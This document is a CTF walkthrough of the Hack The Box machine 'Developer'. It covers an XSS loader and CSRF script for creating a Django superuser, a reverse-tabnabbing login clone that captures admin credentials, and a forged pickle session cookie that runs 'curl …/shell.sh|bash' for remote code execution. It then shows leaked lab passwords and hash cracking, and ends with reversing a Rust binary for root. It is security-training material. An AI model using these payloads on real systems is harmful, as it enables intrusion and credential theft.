# Basic
Target: 10.10.11.103

## Ports

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 36:aa:93:e4:a4:56:ab:39:86:66:bf:3e:09:fa:eb:e0 (RSA)
|   256 11:fb:e9:89:2e:4b:66:40:7b:6b:01:cf:f2:f2:ee:ef (ECDSA)
|_  256 77:56:93:6e:5f:ea:e2:ad:b0:2e:cf:23:9d:66:ed:12 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://developer.htb/
Service Info: Host: developer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kerne
```

with feroxbuster i found the django administration portal
http://developer.htb/admin



# portal & django

create an account and login

We need to solve at least one challange

I choosed PSE, to resolve this we can extract the powershell code with Encryption.exe -extract:code.txt
Online i found a ready Rijndael decrypt function: https://www.alkanesolutions.co.uk/2015/05/20/rijndael-encryption-and-decryption-in-c-and-powershell/

with the pass, salt and iv from theextracted code i modified the function to get the flag



```powershell

[Reflection.Assembly]::LoadWithPartialName("System.Security") | Out-Null

function Decrypt-String($stringToDecrypt, $passph, $salt, $initVector)
{

	# Create a COM Object for RijndaelManaged Cryptography
	$rm = new-Object System.Security.Cryptography.RijndaelManaged
    $pass = [Text.Encoding]::UTF8.GetBytes($passph) 
    $salt = [Text.Encoding]::UTF8.GetBytes($salt) 
	$cipherTextBytes = [Convert]::FromBase64String($stringToDecrypt)
    $rm.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, "SHA1", 5).GetBytes(32)
    $rm.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($initVector) )[0..15] 	
	# Starts the Decryption using the Key and Initialisation Vector
	$d = $rm.CreateDecryptor()
	# Create a New memory stream with the encrypted value.
	$ms = new-Object IO.MemoryStream @(,$cipherTextBytes)
	# Read the new memory stream and read it in the cryptology stream
	$cs = new-Object Security.Cryptography.CryptoStream $ms,$d,"Read"
	$decryptedByteCount = 0;	
	$decryptedByteCount = $cs.Read($cipherTextBytes, 0, $cipherTextBytes.Length);
    	$cs.Close();
	# Stops the cryptology stream
	$cs.Close()
	# Stops the memory stream
	$ms.Close()
	# Clears the RijndaelManaged Cryptology IV and Key
	$rm.Clear()	
	return [Text.Encoding]::UTF8.GetString($cipherTextBytes, 0, $decryptedByteCount).TrimEnd([char]0x0000); 
}

$passph="AmazinglyStrongPassword"
$salt="CrazilySimpleSalt"
$init="StupidlyEasy_IV"
$p = Decrypt-String "X/o8VJQE1pyQhjmpcwk45+L069bivpF63PjZP4z7ahKaC+jv89NT6ze0T5id0lWC" $passph $salt $init
Write-Output $p
```

Flag: DHTB{P0w3rsh3lL_F0r3n51c_M4dn3s5}

Now we can submit a Walkthrough

![[docs/Pasted image 20211028111747.png]]

admin@developer.htb

# CSRF and CORS bypass via XSS (unintended way)

[[../../../OWASP and Web Attacks/CSRF]]

IDEA:

Send the admin to a site which sends a post request to set me as super user
As we dont know the user id we need first create a new user
so the steps are as followed:

1. get a csrf token via GET
2. create a user via POST
3. use the redirect URL to update the user with a second POST request
4. update the post request

This only works, if we found an XSS on the site, without, the CORS Policy would not allow a request from our web server

on the post walkthrough site we can submit an link with xss into it

[[../../../OWASP and Web Attacks/XSS]]

```html
javascript:(onclick=document.write('<script src=http://10.10.14.227/sec.js></script>'))
```

On our Server we start a python server and host the

sec.js
```js
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
  };

// Step1 get the cookie
var req = new XMLHttpRequest();
req.open('GET','http://developer.htb/admin', false);
req.send(null);
    
var csrf = getCookie("csrftoken");

// Step2 create the user
var xhr = new XMLHttpRequest();
xhr.open("POST", 'http://developer.htb/admin/auth/user/add/ ', true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
xhr.send("csrfmiddlewaretoken="+csrf+"&username=sec123&password1=hackthebox&password2=hackthebox&_save=Save");
xhr.onload = function () {

	// Step3 Update the user
  var phr = new XMLHttpRequest();
  phr.open("POST", xhr.responseURL, true);
  phr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
	phr.send("csrfmiddlewaretoken="+csrf+"&username=sec123&first_name=&last_name=&email=&is_active=on&is_superuser=on&is_staff=on&last_login_0=&last_login_1=&date_joined_0=2021-10-28&date_joined_1=22%3A06%3A03&initial-date_joined_0=2021-10-28&initial-date_joined_1=22%3A06%3A03&_save=Save");

};
```

to test this it is a good practice is to setup a own django site (the admin panel is default)

![[docs/Pasted image 20211029211453.png]]

--> Problem we have no admin password, so we cant get further with this way

# the intended way (reverse tabnabbing)

https://blog.0xprashant.in/posts/htb-bug/

[[../../../OWASP and Web Attacks/Reverse Tabnabbing]]


![[docs/Pasted image 20211031011627.png]]


so we create a write up with the following payload

```html
<html>
 <body>
  <script>
   if (window.opener) {
      window.opener.location = "http://10.10.14.227/accounts/login/";
   }
  </script>
 </body>
</html>

```

then we clone the account portal (not the django portal!) as index.html
and edit the links to development.htb host to get them working

```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="http://developer.htb/img/favicon.ico">
    <link rel="stylesheet" href="http://developer.htb/static/css/jquery.toasts.css">
    <script src="http://developer.htb/static/js/all.min.js"></script>
    <script src="http://developer.htb/static/js/jquery-3.2.1.min.js"></script>
    <title>Login | Developer.HTB</title>

    <!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="http://developer.htb/static/css/bootstrap.min.css">

    <!-- Custom styles for this template -->
    <link href="http://developer.htb/static/css/signin.css" rel="stylesheet">
  </head>

  <body class="text-center">
 
    <form class="form-signin" action="/accounts/login/" method="post">
    	<input type="hidden" name="csrfmiddlewaretoken" value="ubT8nig7GmJ0BSakA34ejZQ3xgpepwDpt8Qa8oFtufmuFCPOqCYPOtqHGtxsxzIV">
      <img class="mb-4" src="http://developer.htb/static/img/logo.png" alt="" width="72" height="72">
      <h1 class="h3 mb-3 font-weight-normal">Welcome back!</h1>
      <label for="uname" class="sr-only">User Name</label>
      <input type="text" id="id_login" name="login" placeholder="Username" class="form-control" required autofocus>
      <label for="password" class="sr-only">Password</label>
      <input type="password" id="id_password" name="password" placeholder="Password" class="form-control" required>

      
      <button id="loginbtn" class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
          <a href="http://developer.htb/accounts/password/reset/" class="auth-link">Forgot password?</a>
		<div class="text-center mt-4 font-weight-light"> Don't have an account? <a href="http://developer.htb/accounts/signup/" >Click here!</a>      
      <p class="mt-5 mb-3 text-muted">&copy; Developer.HTB 2021</p>
    </form>

<script src="http://developer.htb/static/js/jquery.toast.js"></script> 
<script>


</script>
  </body>
</html>
```

then we need a python server who can receive and print POST requests, i used this one from here: https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7

and tuned it that it is also providing files from the get method

```python
def do_GET(self):
        logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
        self._set_response()
        if self.path == "/accounts/login/":
            f = open("index.html", "r")
        else:
            f = open(self.path.replace("/",""), "r")
        self.wfile.write(f.read().encode('utf-8'))
        #self.wfile.write("GET request for {}".format(self.path).encode('utf-8'))

```

now we submit our write up: http://10.10.14.227/writeup.html

and wait for the requests:

![[docs/Pasted image 20211031015955.png]]

here we go:

```http
Body:
csrfmiddlewaretoken=ubT8nig7GmJ0BSakA34ejZQ3xgpepwDpt8Qa8oFtufmuFCPOqCYPOtqHGtxsxzIV&login=admin&password=SuperSecurePassword%40HTB2021
```

login=admin
password=SuperSecurePassword@HTB2021




# Sentry

in the django admin portal we found the subdomain to sentry

![[docs/Pasted image 20211029204026.png]]

http://developer-sentry.developer.htb/auth/login/sentry/

we create a new user and found the following users in the system

![[docs/Pasted image 20211029211727.png]]

with the password we can login as

jacob@developer.htb
SuperSecurePassword@HTB2021

## Debug True

on the python server is debug true, this means, we can leak some information

http://developer-sentry.developer.htb/_static/9d42edd9824fbbe18bda533215dc39fe59fb9e75/sentry/dist/


![[docs/Pasted image 20211030152202.png]]

in this post described if we receive the secret sentry key, we can craft a new cookie: https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/

... so we need a stack trace to craft a new cookie:


for this and as jackob we create a new project and then try to delete it --> we trigger this stack trace:

http://developer-sentry.developer.htb/organizations/sentry/projects/new/


![[docs/Pasted image 20211031020811.png]]

and there we can find the system secret key:

'system.secret-key': 'c7f3a64aa184b7cbb1a7cbe9cd544913'

## craft new cookie

as this is an old django version we need python2 for this.
I build a simple docker image to get this working

Dockerfile
```docker
FROM python:2.7
RUN apt-get update
```

build the image and start it

```bash
docker build -t python2.7 .
docker run -it python2.7 sh
```

in the container do the following steps to dowload the same django version and create a project

```bash
mkdir django && cd django
pip installl django~=1.6.11
django-admin.py startproject config .
```

then create the cookie.py with a cookie from the sentry website and your payload

```python
#!/usr/bin/python
import django.core.signing, django.contrib.sessions.serializers
from django.http import HttpResponse
import cPickle
import os

SECRET_KEY='c7f3a64aa184b7cbb1a7cbe9cd544913'
#Initial cookie I had on sentry when trying to reset a password
cookie='gAJ9cQEu:1mgzjA:B9ZAOSWLjLJmyLaObH1gNajCQ4s'
newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django..
contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backk
ends.signed_cookies')
class PickleRce(object):
    def __reduce__(self):
        return (os.system,("curl 10.10.14.227/shell.sh|bash",))
newContent['testcookie'] = PickleRce()

print django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contt
rib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backendss
.signed_cookies',compress=True)
```

--> paste the cookie into your browser session and reload

--> shell as www-user :)


## rabbit holes

There is a RCE Exploit for Sentry 8.0.0 but we need to be admin in the admin panel, so we cant use this
https://doc.lagout.org/Others/synacktiv_advisory_sentry_pickle.pdf

--> Javascript in the Username breaks the site...

![[docs/Pasted image 20211029213644.png]]


found an xss on the issue site, when you hover over the "assign to" and you have javascript in the username

http://developer-sentry.developer.htb/sentry/developer/issues/1/

![[docs/Pasted image 20211030163700.png]]

Webhooks are active only on the internal project
http://developer-sentry.developer.htb/api/0/projects/sentry/internal/


# on the box
we see there are two users in home

karl and mark.
Karl we already noticed as the admin on the sentry web app, so we should try to get his password


searching for sentry we found the config with some sql credentials

```python
DATABASES = {
    'default': {
        'ENGINE': 'sentry.db.postgres',
        'NAME': 'sentry',
        'USER': 'sentry',
        'PASSWORD': 'SentryPassword2021',
        'HOST': 'localhost',
        'PORT': '',
    }

SENTRY_REDIS_OPTIONS = {
    'hosts': {
        0: {
            'host': '127.0.0.1',
            'port': 6379,
            'password': 'g7dRAO6BjTXMtP3iXGJjrSkz2H9Zhm0CAp2BnXE8h92AOWsPZ2zvtAapzrP8sqPR92aWN9DA207XmUTe',
        }
    }
}
```

and another secret key? -> useless
`system.secret-key: '2s378&bp%8-_udoso+hgn!$-)kil^6y!u3xr*+xuwo_7v&o023'`


get password hash from karl via postgres sql

we can connect to the sql database and retrieve the hash

![[docs/Pasted image 20211031142019.png]]
![[docs/Pasted image 20211031141046.png]]

![[docs/Pasted image 20211031140928.png]]

with hashcat we can crack it.

```plaintext
pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI=:insaneclownposse
```

and we can ssh into the box via karl and his password: insaneclownposse
--> got the user flag


# priv esc

we can run /root/.auth/authenticator as sudo

## rust reverse engineering

[[../../../Binary Exploitation/Dynamic Analyses/pwndbg]]

digging into the binary

first install pwndbg from github and copy the binary to you local machine

then start the debugger

```bash
gdb authenticator
```

start with auto breakpoint in main
```gdb
start
```

the fist goal is to find the point where we enter the password, for this we need to step through the binary until we find it


## Step by Step solution

we set a breakpoint on the only function in main

![[docs/Pasted image 20211101113922.png]]

```gdb
b *0x55555555bfec
```

continue to this function and then step into it 

```bash
c
s
```

in this function we go with next until the password prompt will pop up, we notice the function and set next break point and restart the tool

```gdb
b *0x555555582df0
```


now we can go to this point directly
```bash
run <- run until breakpoint
c <- skip our first breakpoint
s <- dig into this function
```

![[docs/Pasted image 20211101120032.png]]

we repeat this step until we reach the exactly input function, to go faster we delete all breakpoints and only set the latest, so we can jump directly to it with run

the process is every time the same:

1. notice function address
2. delete all breakpoints `d br` 
3. set the new breakpoint `b *`
4. run program, it stops on the new breakpoint `r`
5. step into the function `s`
6. hit next until password prompt `n`

we do this until we reach the `std::io::read_until` function, which mean here happens the read from the cmd, we dont need to step into this function


List of breakpoints

0x55555555b204
0x55555555b231
0x55555555b876
0x555555586a60
0x55555556ec21

![[docs/Pasted image 20211101121923.png]]

then we enter some false password and step further to check what happens
after a view steps we recognize this function is called `crypto::aes::ctr`

![[docs/Pasted image 20211101123014.png]]

this means there is AES decryption with CTR. 
If we set this in cyberchef it told us that we need at least a 16bytes long key and IV, so we take a look at this

![[docs/Pasted image 20211101123225.png]]

so we set our final breakpoint on this function: 0x55555555b936

![[docs/Pasted image 20211101142134.png]]

now we check our register (as these stores the parameters for the function) and notice there is some data into it, so we save this hex 

![[docs/Pasted image 20211101124324.png]]

![[docs/Pasted image 20211101124534.png]]

now we try to enter these values into cyber chef (we need to test what is the IV and what is the KEY by switching them)

IV
```plain
76 1f 59 e3  d9 d2 95 9a  a7 98 55 dc  06 20 81 6a
```

KEY
```plain
a3 e8 32 34  5c 79 91 61  9e 20 d4 3d  be f4 f5 d5
```

HASH
```plain
fe 1b 25 f0  80 6a 97 ca  78 80 fd 58  fc 5c 20 23 6c a2 db d0  e5 02 b5 fa  eb c0 af 3a  9f 27 15 2c
```

![[docs/Pasted image 20211101124849.png]]

but then we get the password: RustForSecurity@Developer@2021:)

and we can root the box!

![[docs/Pasted image 20211101125952.png]]

